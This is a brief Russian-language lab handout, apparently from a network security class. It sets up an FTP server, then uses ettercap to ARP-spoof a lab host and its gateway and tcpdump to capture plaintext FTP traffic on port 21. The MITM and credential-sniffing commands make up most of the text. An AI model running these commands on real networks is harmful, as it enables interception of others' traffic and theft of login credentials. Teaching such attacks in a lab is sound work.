Сервер FTP

Установка и запуск сервиса

```
root@server:~# apt install proftpd-basic

```

Утилита ettercap

Установка

```
lan# apt install ettercap-text-only
```

ARP спуфинг
```
win arp -a
```
```
lan# ettercap -T -M arp //192.168.100+X.101// //192.168.100+X.1//
```
```
win arp -a
```
```
lan# tcpdump -n -s0 -A port 21
```

Произвести подключение к FTP и посмотреть трафик
